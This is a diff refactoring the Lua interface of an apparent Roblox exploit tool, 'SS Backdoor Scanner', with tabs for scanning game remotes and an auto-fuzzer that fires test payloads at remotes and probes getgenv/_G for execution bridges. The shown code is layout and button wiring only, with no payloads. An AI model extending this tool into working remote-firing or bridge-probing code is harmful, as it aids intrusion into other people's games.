+    local hitbox = Instance.new("TextButton")
+    hitbox.Size = UDim2.new(1,0,1,0)
+    hitbox.BackgroundTransparency = 1
+    hitbox.Text = ""
+    hitbox.Parent = ctr
+    hitbox.MouseButton1Click:Connect(function()
+        state = not state
+        TweenService:Create(track, TweenInfo.new(0.18), {BackgroundColor3=state and T.ACC or T.BG3}):Play()
+        TweenService:Create(knob, TweenInfo.new(0.18), {Position=state and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)}):Play()
         if onChange then onChange(state) end
     end)
     return ctr
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §7  MAIN WINDOW  +  TITLE BAR
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 if PGui:FindFirstChild("SSv4") then PGui.SSv4:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SSv4"; ScreenGui.ResetOnSpawn=false
-ScreenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; ScreenGui.Parent=PGui
+ScreenGui.Name = "SSv4"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent = PGui
 
 local Win = Instance.new("Frame")
-Win.Size=UDim2.new(0,800,0,540); Win.Position=UDim2.new(0.5,-400,0.5,-270)
-Win.BackgroundColor3=T.BG1; Win.BorderSizePixel=0; Win.ClipsDescendants=true; Win.Parent=ScreenGui
-corner(Win,10); stroke(Win,T.BDR,1)
+Win.Size = UDim2.new(0,820,0,550)
+Win.Position = UDim2.new(0.5,-410,0.5,-275)
+Win.BackgroundColor3 = T.BG1
+Win.BorderSizePixel = 0
+Win.ClipsDescendants = true
+Win.Parent = ScreenGui
+mkCorner(Win, 10)
+mkStroke(Win, T.BDR, 1)
 
--- Shadow
-local shad=Instance.new("ImageLabel"); shad.Size=UDim2.new(1,50,1,50); shad.Position=UDim2.new(0,-25,0,-25)
-shad.BackgroundTransparency=1; shad.Image="rbxassetid://5554236805"
-shad.ImageColor3=Color3.new(0,0,0); shad.ImageTransparency=0.65
-shad.ScaleType=Enum.ScaleType.Slice; shad.SliceCenter=Rect.new(23,23,277,277); shad.ZIndex=-1; shad.Parent=Win
+-- Drop shadow
+local shadow = Instance.new("ImageLabel")
+shadow.Size = UDim2.new(1,50,1,50)
+shadow.Position = UDim2.new(0,-25,0,-25)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://5554236805"
+shadow.ImageColor3 = Color3.new(0,0,0)
+shadow.ImageTransparency = 0.65
+shadow.ScaleType = Enum.ScaleType.Slice
+shadow.SliceCenter = Rect.new(23,23,277,277)
+shadow.ZIndex = -1
+shadow.Parent = Win
 
 -- Title bar
-local TB=Instance.new("Frame"); TB.Size=UDim2.new(1,0,0,44); TB.BackgroundColor3=T.TTL; TB.BorderSizePixel=0; TB.Parent=Win
-local TBLine=Instance.new("Frame"); TBLine.Size=UDim2.new(1,0,0,2); TBLine.Position=UDim2.new(0,0,1,-2); TBLine.BackgroundColor3=T.ACC; TBLine.BorderSizePixel=0; TBLine.Parent=TB
+local TB = Instance.new("Frame")
+TB.Size = UDim2.new(1,0,0,44)
+TB.BackgroundColor3 = T.TTL
+TB.BorderSizePixel = 0
+TB.Parent = Win
 
--- Title icon + gradient badge
-local ticon=lbl(TB,"⚡",20,T.ACC,Enum.Font.GothamBold,Enum.TextXAlignment.Center); ticon.Size=UDim2.new(0,36,1,0); ticon.Position=UDim2.new(0,8,0,0)
-local tmain=lbl(TB,"SS Backdoor Scanner  v"..CFG.VERSION,14,T.TXT); tmain.Size=UDim2.new(1,-200,1,0); tmain.Position=UDim2.new(0,46,0,0)
-local tsub=lbl(TB,"2026 Edition · Full GUI",10,T.TXM,Enum.Font.Gotham,Enum.TextXAlignment.Right); tsub.Size=UDim2.new(0,150,1,0); tsub.Position=UDim2.new(1,-220,0,0)
+local tbAccentLine = Instance.new("Frame")
+tbAccentLine.Size = UDim2.new(1,0,0,2)
+tbAccentLine.Position = UDim2.new(0,0,1,-2)
+tbAccentLine.BackgroundColor3 = T.ACC
+tbAccentLine.BorderSizePixel = 0
+tbAccentLine.Parent = TB
 
-local bClose=btn(TB,"✕",T.BRED,T.TXT,UDim2.new(0,30,0,26)); bClose.Position=UDim2.new(1,-38,0.5,-13); bClose.TextSize=12
-local bMin=btn(TB,"─",T.BG3,T.TXS,UDim2.new(0,30,0,26)); bMin.Position=UDim2.new(1,-72,0.5,-13); bMin.TextSize=12
+local tbIcon = mkLbl(TB, "⚡", 20, T.ACC, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
+tbIcon.Size = UDim2.new(0,36,1,0)
+tbIcon.Position = UDim2.new(0,8,0,0)
 
--- Drag
-local drag,dragSt,winSt=false,nil,nil
-TB.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=true; dragSt=i.Position; winSt=Win.Position end end)
-TB.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=false end end)
-UserInputService.InputChanged:Connect(function(i) if drag and i.UserInputType==Enum.UserInputType.MouseMovement then local d=i.Position-dragSt; Win.Position=UDim2.new(winSt.X.Scale,winSt.X.Offset+d.X,winSt.Y.Scale,winSt.Y.Offset+d.Y) end end)
+local tbTitle = mkLbl(TB, "SS Backdoor Scanner  v"..CFG.VERSION, 14, T.TXT)
+tbTitle.Size = UDim2.new(1,-210,1,0)
+tbTitle.Position = UDim2.new(0,46,0,0)
 
-bClose.MouseButton1Click:Connect(function() TweenService:Create(Win,TweenInfo.new(0.2,Enum.EasingStyle.Quart),{Size=UDim2.new(0,0,0,0),Position=UDim2.new(Win.Position.X.Scale,Win.Position.X.Offset+400,Win.Position.Y.Scale,Win.Position.Y.Offset+270)}):Play(); task.delay(0.25,function() ScreenGui:Destroy() end) end)
-bMin.MouseButton1Click:Connect(function() S.minimised=not S.minimised; TweenService:Create(Win,TweenInfo.new(0.2,Enum.EasingStyle.Quart),{Size=S.minimised and UDim2.new(0,800,0,44) or UDim2.new(0,800,0,540)}):Play() end)
+local tbSub = mkLbl(TB, "2026 Edition", 10, T.TXM, Enum.Font.Gotham, Enum.TextXAlignment.Right)
+tbSub.Size = UDim2.new(0,100,1,0)
+tbSub.Position = UDim2.new(1,-174,0,0)
 
--- ════════════════════════════════════════════════════════════════════════
+local bClose = mkBtn(TB, "✕", T.BRED, T.TXT, UDim2.new(0,30,0,26))
+bClose.Position = UDim2.new(1,-38,0.5,-13)
+bClose.TextSize = 12
+
+local bMin = mkBtn(TB, "─", T.BG3, T.TXS, UDim2.new(0,30,0,26))
+bMin.Position = UDim2.new(1,-72,0.5,-13)
+bMin.TextSize = 12
+
+-- Drag logic
+local dragging, dragStart, winStart = false, nil, nil
+TB.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true; dragStart = inp.Position; winStart = Win.Position
+    end
+end)
+TB.InputEnded:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+end)
+UserInputService.InputChanged:Connect(function(inp)
+    if dragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = inp.Position - dragStart
+        Win.Position = UDim2.new(
+            winStart.X.Scale, winStart.X.Offset + delta.X,
+            winStart.Y.Scale, winStart.Y.Offset + delta.Y
+        )
+    end
+end)
+
+bClose.MouseButton1Click:Connect(function()
+    TweenService:Create(Win, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
+        Size = UDim2.new(0,0,0,0),
+        Position = UDim2.new(Win.Position.X.Scale, Win.Position.X.Offset+410, Win.Position.Y.Scale, Win.Position.Y.Offset+275),
+    }):Play()
+    task.delay(0.25, function() ScreenGui:Destroy() end)
+end)
+
+bMin.MouseButton1Click:Connect(function()
+    S.minimised = not S.minimised
+    TweenService:Create(Win, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
+        Size = S.minimised and UDim2.new(0,820,0,44) or UDim2.new(0,820,0,550)
+    }):Play()
+end)
+
+-- ═══════════════════════════════════════════════════════════════════════
 -- §8  TAB BAR  (6 tabs)
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local TabBar=Instance.new("Frame"); TabBar.Size=UDim2.new(1,0,0,36); TabBar.Position=UDim2.new(0,0,0,44)
-TabBar.BackgroundColor3=T.BG2; TabBar.BorderSizePixel=0; TabBar.Parent=Win
-ll(TabBar,2,Enum.FillDirection.Horizontal); pad(TabBar,3,8,3,8)
-local TBDiv=Instance.new("Frame"); TBDiv.Size=UDim2.new(1,0,0,1); TBDiv.Position=UDim2.new(0,0,1,-1); TBDiv.BackgroundColor3=T.BDR; TBDiv.BorderSizePixel=0; TBDiv.Parent=TabBar
+local TabBar = Instance.new("Frame")
+TabBar.Size = UDim2.new(1,0,0,36)
+TabBar.Position = UDim2.new(0,0,0,44)
+TabBar.BackgroundColor3 = T.BG2
+TabBar.BorderSizePixel = 0
+TabBar.Parent = Win
+mkList(TabBar, 2, Enum.FillDirection.Horizontal)
+mkPad(TabBar, 3, 8, 3, 8)
 
-local CA=Instance.new("Frame"); CA.Size=UDim2.new(1,0,1,-80); CA.Position=UDim2.new(0,0,0,80); CA.BackgroundTransparency=1; CA.Parent=Win
+local tabDivider = Instance.new("Frame")
+tabDivider.Size = UDim2.new(1,0,0,1)
+tabDivider.Position = UDim2.new(0,0,1,-1)
+tabDivider.BackgroundColor3 = T.BDR
+tabDivider.BorderSizePixel = 0
+tabDivider.Parent = TabBar
+
+-- Content area (below title + tab bar)
+local ContentArea = Instance.new("Frame")
+ContentArea.Size = UDim2.new(1,0,1,-80)
+ContentArea.Position = UDim2.new(0,0,0,80)
+ContentArea.BackgroundTransparency = 1
+ContentArea.Parent = Win
 
 local TABS = {
     {"Scanner",  "🔍"},
@@ -434,302 +545,634 @@ local TABS = {
 }
 
 local function switchTab(name)
-    S.activeTab=name
-    for _,td in ipairs(TABS) do
-        local n=td[1]; local b=tabButtons[n]; local f=tabFrames[n]
-        local on=(n==name)
-        TweenService:Create(b,TweenInfo.new(0.12),{BackgroundColor3=on and T.TABON or T.TABOF,TextColor3=on and T.TXT or T.TXM}):Play()
-        if f then f.Visible=on end
+    for _, td in ipairs(TABS) do
+        local n = td[1]
+        local b = tabButtons[n]
+        local f = tabFrames[n]
+        local on = (n == name)
+        if b then
+            TweenService:Create(b, TweenInfo.new(0.12), {
+                BackgroundColor3 = on and T.TABON or T.TABOF,
+                TextColor3 = on and T.TXT or T.TXM,
+            }):Play()
+        end
+        if f then f.Visible = on end
     end
 end
 
-for i,td in ipairs(TABS) do
-    local name,icon=td[1],td[2]
-    local b=Instance.new("TextButton"); b.Size=UDim2.new(0,116,1,0); b.BackgroundColor3=T.TABOF; b.TextColor3=T.TXM
-    b.Font=Enum.Font.GothamBold; b.TextSize=11; b.Text=icon.."  "..name; b.BorderSizePixel=0; b.AutoButtonColor=false; b.Parent=TabBar; corner(b,5)
-    tabButtons[name]=b; b.MouseButton1Click:Connect(function() switchTab(name) end)
-    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,1,0); f.BackgroundTransparency=1; f.Visible=false; f.Parent=CA
-    tabFrames[name]=f
+for _, td in ipairs(TABS) do
+    local name, icon = td[1], td[2]
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0,120,1,0)
+    b.BackgroundColor3 = T.TABOF
+    b.TextColor3 = T.TXM
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 11
+    b.Text = icon .. "  " .. name
+    b.BorderSizePixel = 0
+    b.AutoButtonColor = false
+    b.Parent = TabBar
+    mkCorner(b, 5)
+    tabButtons[name] = b
+    b.MouseButton1Click:Connect(function() switchTab(name) end)
+
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1,0,1,0)
+    f.BackgroundTransparency = 1
+    f.Visible = false
+    f.Parent = ContentArea
+    tabFrames[name] = f
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §9  SCANNER TAB
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local SC=tabFrames["Scanner"]
+local SC = tabFrames["Scanner"]
 
--- Stats bar (5 stats now including G-Bridge)
-local statsBar=Instance.new("Frame"); statsBar.Size=UDim2.new(1,-16,0,52); statsBar.Position=UDim2.new(0,8,0,8)
-statsBar.BackgroundColor3=T.BG2; statsBar.BorderSizePixel=0; statsBar.Parent=SC; corner(statsBar,8); stroke(statsBar,T.BDR)
-ll(statsBar,0,Enum.FillDirection.Horizontal)
+-- Stats bar
+local statsBar = Instance.new("Frame")
+statsBar.Size = UDim2.new(1,-16,0,52)
+statsBar.Position = UDim2.new(0,8,0,8)
+statsBar.BackgroundColor3 = T.BG2
+statsBar.BorderSizePixel = 0
+statsBar.Parent = SC
+mkCorner(statsBar, 8)
+mkStroke(statsBar, T.BDR)
+mkList(statsBar, 0, Enum.FillDirection.Horizontal)
 
-local STAT_DEFS={
-    {k="total",  l="Remotes",     c=T.INFO},
-    {k="susp",   l="Suspicious",  c=T.CRIT},
-    {k="script", l="Flagged Scr", c=T.WARN},
-    {k="gbridge",l="G-Bridges",   c=T.PRP},
-    {k="time",   l="Scan Time",   c=T.OK},
+local STAT_DEFS = {
+    {k="total",   l="Remotes",     c=T.INFO},
+    {k="susp",    l="High-Risk",   c=T.CRIT},
+    {k="scripts", l="Scripts",     c=T.WARN},
+    {k="gbridge", l="G-Bridges",   c=T.PRP },
+    {k="time",    l="Scan Time",   c=T.OK  },
 }
 
-for i,def in ipairs(STAT_DEFS) do
-    local cell=Instance.new("Frame"); cell.Size=UDim2.new(0.2,0,1,0); cell.BackgroundTransparency=1; cell.Parent=statsBar
-    if i<5 then local d=Instance.new("Frame"); d.Size=UDim2.new(0,1,0.55,0); d.Position=UDim2.new(1,0,0.225,0); d.BackgroundColor3=T.BDR; d.BorderSizePixel=0; d.Parent=cell end
-    local vl=lbl(cell,"0",20,def.c,Enum.Font.GothamBold,Enum.TextXAlignment.Center); vl.Size=UDim2.new(1,0,0,24); vl.Position=UDim2.new(0,0,0,4); statLabels[def.k]=vl
-    local sl=lbl(cell,def.l,10,T.TXM,Enum.Font.Gotham,Enum.TextXAlignment.Center); sl.Size=UDim2.new(1,0,0,13); sl.Position=UDim2.new(0,0,0,30)
+for i, def in ipairs(STAT_DEFS) do
+    local cell = Instance.new("Frame")
+    cell.Size = UDim2.new(0.2, 0, 1, 0)
+    cell.BackgroundTransparency = 1
+    cell.Parent = statsBar
+    if i < 5 then
+        local div = Instance.new("Frame")
+        div.Size = UDim2.new(0,1,0.55,0)
+        div.Position = UDim2.new(1,0,0.225,0)
+        div.BackgroundColor3 = T.BDR
+        div.BorderSizePixel = 0
+        div.Parent = cell
+    end
+    local vLabel = mkLbl(cell, "0", 20, def.c, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
+    vLabel.Size = UDim2.new(1,0,0,24)
+    vLabel.Position = UDim2.new(0,0,0,4)
+    statLabels[def.k] = vLabel
+    local nLabel = mkLbl(cell, def.l, 10, T.TXM, Enum.Font.Gotham, Enum.TextXAlignment.Center)
+    nLabel.Size = UDim2.new(1,0,0,14)
+    nLabel.Position = UDim2.new(0,0,0,30)
 end
 
 local function updateStats()
-    local ns=0; for _,r in ipairs(S.remotes) do if r.risk>=50 then ns+=1 end end
-    statLabels["total"].Text=tostring(#S.remotes)
-    statLabels["susp"].Text=tostring(ns)
-    statLabels["script"].Text=tostring(#S.scripts)
-    statLabels["gbridge"].Text=tostring(#S.gbridgeFinds)
+    local susp = 0
+    for _, r in ipairs(S.remotes) do if r.risk >= 50 then susp += 1 end end
+    statLabels["total"].Text   = tostring(#S.remotes)
+    statLabels["susp"].Text    = tostring(susp)
+    statLabels["scripts"].Text = tostring(#S.scripts)
+    statLabels["gbridge"].Text = tostring(#S.gbridgeFinds)
 end
 
 -- Scan control buttons
-local scanBtns=Instance.new("Frame"); scanBtns.Size=UDim2.new(1,-16,0,32); scanBtns.Position=UDim2.new(0,8,0,68); scanBtns.BackgroundTransparency=1; scanBtns.Parent=SC
-ll(scanBtns,6,Enum.FillDirection.Horizontal)
-local bScan    =btn(scanBtns,"⚡  Deep Scan",T.BBLU,T.TXT,UDim2.new(0,120,1,0))
-local bScanStop=btn(scanBtns,"⏹ Stop",      T.BG3, T.TXS,UDim2.new(0,70,1,0))
-local bClear   =btn(scanBtns,"🗑 Clear",     T.BG3, T.TXS,UDim2.new(0,80,1,0))
-local bFWAll   =btn(scanBtns,"🛡 Firewall All Susp",T.BRED,T.TXT,UDim2.new(0,158,1,0))
-local bAddFuzz =btn(scanBtns,"🤖 Send to Fuzzer",T.BPUR,T.TXT,UDim2.new(0,145,1,0))
+local scanBtns = Instance.new("Frame")
+scanBtns.Size = UDim2.new(1,-16,0,30)
+scanBtns.Position = UDim2.new(0,8,0,68)
+scanBtns.BackgroundTransparency = 1
+scanBtns.Parent = SC
+mkList(scanBtns, 6, Enum.FillDirection.Horizontal)
+
+bScan = mkBtn(scanBtns, "⚡  Deep Scan",           T.BBLU, T.TXT, UDim2.new(0,120,1,0))
+local bStop    = mkBtn(scanBtns, "⏹ Stop",           T.BG3,  T.TXS, UDim2.new(0,68,1,0))
+local bClear   = mkBtn(scanBtns, "🗑 Clear",          T.BG3,  T.TXS, UDim2.new(0,75,1,0))
+local bFWAll   = mkBtn(scanBtns, "🛡 Firewall Susp",  T.BRED, T.TXT, UDim2.new(0,140,1,0))
+local bToFuzzer= mkBtn(scanBtns, "🤖 → Fuzzer",       T.BPUR, T.TXT, UDim2.new(0,105,1,0))
 
 -- Progress bar
-local pgBG=Instance.new("Frame"); pgBG.Size=UDim2.new(1,-16,0,4); pgBG.Position=UDim2.new(0,8,0,107); pgBG.BackgroundColor3=T.BG3; pgBG.BorderSizePixel=0; pgBG.Parent=SC; corner(pgBG,2)
-ProgressFill=Instance.new("Frame"); ProgressFill.Size=UDim2.new(0,0,1,0); ProgressFill.BackgroundColor3=T.ACC; ProgressFill.BorderSizePixel=0; ProgressFill.Parent=pgBG; corner(ProgressFill,2)
-ProgressLabel=lbl(SC,"Ready — click Deep Scan to begin.",11,T.TXM,Enum.Font.Gotham); ProgressLabel.Size=UDim2.new(1,-16,0,13); ProgressLabel.Position=UDim2.new(0,8,0,114)
+local pgBG = Instance.new("Frame")
+pgBG.Size = UDim2.new(1,-16,0,4)
+pgBG.Position = UDim2.new(0,8,0,105)
+pgBG.BackgroundColor3 = T.BG3
+pgBG.BorderSizePixel = 0
+pgBG.Parent = SC
+mkCorner(pgBG, 2)
+
+ProgressFill = Instance.new("Frame")
+ProgressFill.Size = UDim2.new(0,0,1,0)
+ProgressFill.BackgroundColor3 = T.ACC
+ProgressFill.BorderSizePixel = 0
+ProgressFill.Parent = pgBG
+mkCorner(ProgressFill, 2)
+
+ProgressLabel = mkLbl(SC, "Ready — click Deep Scan to begin.", 11, T.TXM, Enum.Font.Gotham)
+ProgressLabel.Size = UDim2.new(1,-16,0,13)
+ProgressLabel.Position = UDim2.new(0,8,0,112)
 
 -- Column headers
-local hdr=Instance.new("Frame"); hdr.Size=UDim2.new(1,-16,0,22); hdr.Position=UDim2.new(0,8,0,131); hdr.BackgroundColor3=T.BG3; hdr.BorderSizePixel=0; hdr.Parent=SC; corner(hdr,4)
-local function hc(t,w,x) local l=lbl(hdr,t,9,T.TXM,Enum.Font.GothamBold); l.Size=UDim2.new(0,w,1,0); l.Position=UDim2.new(0,x,0,0) end
-hc("RISK",  50,  6); hc("TYPE", 100, 60); hc("PATH", 240,165); hc("KEYWORD/FLAG",110,410); hc("ACTIONS",90,528)
+local hdrBar = Instance.new("Frame")
+hdrBar.Size = UDim2.new(1,-16,0,20)
+hdrBar.Position = UDim2.new(0,8,0,129)
+hdrBar.BackgroundColor3 = T.BG3
+hdrBar.BorderSizePixel = 0
+hdrBar.Parent = SC
+mkCorner(hdrBar, 4)
+
+local function hdrCol(text, width, xOffset)
+    local h = mkLbl(hdrBar, text, 9, T.TXM, Enum.Font.GothamBold)
+    h.Size = UDim2.new(0, width, 1, 0)
+    h.Position = UDim2.new(0, xOffset, 0, 0)
+end
+hdrCol("RISK",   50,   6)
+hdrCol("TYPE",  100,  60)
+hdrCol("PATH",  240, 164)
+hdrCol("FLAG",  120, 408)
+hdrCol("ACT",    80, 534)
 
 -- Results scroll
-local rSF=sf(SC,UDim2.new(1,-16,1,-163),UDim2.new(0,8,0,157)); rSF.BackgroundColor3=T.BG2; rSF.BackgroundTransparency=0; corner(rSF,6); stroke(rSF,T.BDR); pad(rSF,4,4,4,4)
-ResultsList=Instance.new("Frame"); ResultsList.Size=UDim2.new(1,0,0,0); ResultsList.BackgroundTransparency=1; ResultsList.Parent=rSF; ll(ResultsList,3)
+local rSF = mkSF(SC, UDim2.new(1,-16,1,-157), UDim2.new(0,8,0,153))
+rSF.BackgroundColor3 = T.BG2
+rSF.BackgroundTransparency = 0
+mkCorner(rSF, 6)
+mkStroke(rSF, T.BDR)
+mkPad(rSF, 4, 4, 4, 4)
+ResultsList = Instance.new("Frame")
+ResultsList.Size = UDim2.new(1,0,0,0)
+ResultsList.BackgroundTransparency = 1
+ResultsList.Parent = rSF
+mkList(ResultsList, 3)
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §10  AUTO-FUZZER TAB
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local FZ=tabFrames["Fuzzer"]
+local FZ = tabFrames["Fuzzer"]
 
--- Description banner
-local fzBanner=Instance.new("Frame"); fzBanner.Size=UDim2.new(1,-16,0,44); fzBanner.Position=UDim2.new(0,8,0,8); fzBanner.BackgroundColor3=Color3.fromRGB(20,15,35); fzBanner.BorderSizePixel=0; fzBanner.Parent=FZ; corner(fzBanner,8); stroke(fzBanner,T.PRP,1)
-local fzBanLbl=lbl(fzBanner,"🤖  AUTO-FUZZER  —  Batch-fires every queued remote with test payloads. Detects G-bridges, loadstring responses, and runtime side effects automatically.",12,T.PRP,Enum.Font.Gotham); fzBanLbl.Size=UDim2.new(1,-12,1,0); fzBanLbl.Position=UDim2.new(0,8,0,0); fzBanLbl.TextWrapped=true; fzBanLbl.TextXAlignment=Enum.TextXAlignment.Left; fzBanLbl.TextYAlignment=Enum.TextYAlignment.Center
+local fzBanner = Instance.new("Frame")
+fzBanner.Size = UDim2.new(1,-16,0,40)
+fzBanner.Position = UDim2.new(0,8,0,8)
+fzBanner.BackgroundColor3 = Color3.fromRGB(20,12,32)
+fzBanner.BorderSizePixel = 0
+fzBanner.Parent = FZ
+mkCorner(fzBanner, 8)
+mkStroke(fzBanner, T.PRP, 1)
 
--- Fuzzer controls
-local fzCtrl=Instance.new("Frame"); fzCtrl.Size=UDim2.new(1,-16,0,32); fzCtrl.Position=UDim2.new(0,8,0,60); fzCtrl.BackgroundTransparency=1; fzCtrl.Parent=FZ
-ll(fzCtrl,6,Enum.FillDirection.Horizontal)
-local bFuzzAll    =btn(fzCtrl,"🤖 Fuzz All Queued",  T.BPUR,T.TXT,UDim2.new(0,150,1,0))
-local bFuzzStop   =btn(fzCtrl,"⏹ Stop",              T.BG3, T.TXS,UDim2.new(0,65,1,0))
-local bFuzzClear  =btn(fzCtrl,"🗑 Clear Queue",       T.BG3, T.TXS,UDim2.new(0,105,1,0))
-local bFuzzGBridge=btn(fzCtrl,"🕵 Probe G-Bridge",   T.BBLU,T.TXT,UDim2.new(0,135,1,0))
-local bFuzzMode   =btn(fzCtrl,"Mode: QUICK",          T.BG3, T.PRP,UDim2.new(0,115,1,0))
+local fzBanLbl = mkLbl(fzBanner,
+    "🤖  AUTO-FUZZER  —  Batch-fires every queued remote with test payloads. Logs responses & runtime side effects. 🕵 G-Bridge probe checks _G/shared/getgenv for live execution bridges.",
+    11, T.PRP, Enum.Font.Gotham)
+fzBanLbl.Size = UDim2.new(1,-12,1,0)
+fzBanLbl.Position = UDim2.new(0,8,0,0)
+fzBanLbl.TextWrapped = true
+fzBanLbl.TextXAlignment = Enum.TextXAlignment.Left
+fzBanLbl.TextYAlignment = Enum.TextYAlignment.Center
+
+-- Controls row
+local fzCtrl = Instance.new("Frame")
+fzCtrl.Size = UDim2.new(1,-16,0,30)
+fzCtrl.Position = UDim2.new(0,8,0,56)
+fzCtrl.BackgroundTransparency = 1
+fzCtrl.Parent = FZ
+mkList(fzCtrl, 6, Enum.FillDirection.Horizontal)
+
+local bFuzzAll     = mkBtn(fzCtrl, "🤖 Fuzz All",        T.BPUR, T.TXT, UDim2.new(0,110,1,0))
+local bFuzzStop    = mkBtn(fzCtrl, "⏹ Stop",             T.BG3,  T.TXS, UDim2.new(0,65,1,0))
+local bFuzzClear   = mkBtn(fzCtrl, "🗑 Clear Queue",      T.BG3,  T.TXS, UDim2.new(0,100,1,0))
+local bGBridge     = mkBtn(fzCtrl, "🕵 G-Bridge Probe",  T.BBLU, T.TXT, UDim2.new(0,135,1,0))
+local bFuzzMode    = mkBtn(fzCtrl, "Mode: QUICK",         T.BG3,  T.PRP, UDim2.new(0,110,1,0))
 
 local currentFuzzMode = "QUICK"
 bFuzzMode.MouseButton1Click:Connect(function()
-    currentFuzzMode = currentFuzzMode=="QUICK" and "DEEP" or "QUICK"
-    bFuzzMode.Text = "Mode: "..currentFuzzMode
-    bFuzzMode.TextColor3 = currentFuzzMode=="DEEP" and T.CRIT or T.PRP
+    currentFuzzMode = currentFuzzMode == "QUICK" and "DEEP" or "QUICK"
+    bFuzzMode.Text = "Mode: " .. currentFuzzMode
+    bFuzzMode.TextColor3 = currentFuzzMode == "DEEP" and T.CRIT or T.PRP
 end)
 
--- Split layout: Queue (left) | Results (right)
-local fzLeft=Instance.new("Frame"); fzLeft.Size=UDim2.new(0.42,-6,1,-106); fzLeft.Position=UDim2.new(0,8,0,98); fzLeft.BackgroundTransparency=1; fzLeft.Parent=FZ
-local fzRight=Instance.new("Frame"); fzRight.Size=UDim2.new(0.58,-10,1,-106); fzRight.Position=UDim2.new(0.42,2,0,98); fzRight.BackgroundTransparency=1; fzRight.Parent=FZ
+-- Split: Queue left | Results right
+local fzLeft = Instance.new("Frame")
+fzLeft.Size = UDim2.new(0.4,-6,1,-176)
+fzLeft.Position = UDim2.new(0,8,0,96)
+fzLeft.BackgroundTransparency = 1
+fzLeft.Parent = FZ
 
--- Queue header
-local fzQLbl=lbl(fzLeft,"FUZZ QUEUE",10,T.TXM,Enum.Font.GothamBold); fzQLbl.Size=UDim2.new(1,0,0,14)
-local fzQSF=sf(fzLeft,UDim2.new(1,0,1,-20),UDim2.new(0,0,0,18)); fzQSF.BackgroundColor3=T.BG2; fzQSF.BackgroundTransparency=0; corner(fzQSF,6); stroke(fzQSF,T.BDR); pad(fzQSF,4,4,4,4)
-FuzzQueueList=Instance.new("Frame"); FuzzQueueList.Size=UDim2.new(1,0,0,0); FuzzQueueList.BackgroundTransparency=1; FuzzQueueList.Parent=fzQSF; ll(FuzzQueueList,2)
+local fzRight = Instance.new("Frame")
+fzRight.Size = UDim2.new(0.6,-10,1,-176)
+fzRight.Position = UDim2.new(0.4,2,0,96)
+fzRight.BackgroundTransparency = 1
+fzRight.Parent = FZ
 
--- Results header
-local fzRLbl=lbl(fzRight,"FUZZ RESULTS  (response / side effects)",10,T.TXM,Enum.Font.GothamBold); fzRLbl.Size=UDim2.new(1,0,0,14)
-local fzRSF=sf(fzRight,UDim2.new(1,0,1,-20),UDim2.new(0,0,0,18)); fzRSF.BackgroundColor3=T.BG2; fzRSF.BackgroundTransparency=0; corner(fzRSF,6); stroke(fzRSF,T.BDR); pad(fzRSF,4,4,4,4)
-FuzzResultList=Instance.new("Frame"); FuzzResultList.Size=UDim2.new(1,0,0,0); FuzzResultList.BackgroundTransparency=1; FuzzResultList.Parent=fzRSF; ll(FuzzResultList,3)
+local qLbl = mkLbl(fzLeft, "FUZZ QUEUE", 10, T.TXM, Enum.Font.GothamBold)
+qLbl.Size = UDim2.new(1,0,0,14)
 
--- G-Bridge results (below results)
-local gbLbl=lbl(FZ,"G-BRIDGE / SHARED-TABLE FINDINGS",10,T.TXM,Enum.Font.GothamBold); gbLbl.Size=UDim2.new(1,-16,0,14); gbLbl.Position=UDim2.new(0,8,1,-82)
-local gbSF=sf(FZ,UDim2.new(1,-16,0,62),UDim2.new(0,8,1,-66)); gbSF.BackgroundColor3=Color3.fromRGB(18,12,28); gbSF.BackgroundTransparency=0; corner(gbSF,6); stroke(gbSF,T.PRP,1); pad(gbSF,4,4,4,4)
-GBridgeList=Instance.new("Frame"); GBridgeList.Size=UDim2.new(1,0,0,0); GBridgeList.BackgroundTransparency=1; GBridgeList.Parent=gbSF; ll(GBridgeList,2)
+local fzQSF = mkSF(fzLeft, UDim2.new(1,0,1,-18), UDim2.new(0,0,0,17))
+fzQSF.BackgroundColor3 = T.BG2
+fzQSF.BackgroundTransparency = 0
+mkCorner(fzQSF, 6)
+mkStroke(fzQSF, T.BDR)
+mkPad(fzQSF, 4, 4, 4, 4)
+FuzzQueueList = Instance.new("Frame")
+FuzzQueueList.Size = UDim2.new(1,0,0,0)
+FuzzQueueList.BackgroundTransparency = 1
+FuzzQueueList.Parent = fzQSF
+mkList(FuzzQueueList, 2)
 
--- ════════════════════════════════════════════════════════════════════════
+local rLbl = mkLbl(fzRight, "FUZZ RESULTS", 10, T.TXM, Enum.Font.GothamBold)
+rLbl.Size = UDim2.new(1,0,0,14)
+
+local fzRSF = mkSF(fzRight, UDim2.new(1,0,1,-18), UDim2.new(0,0,0,17))
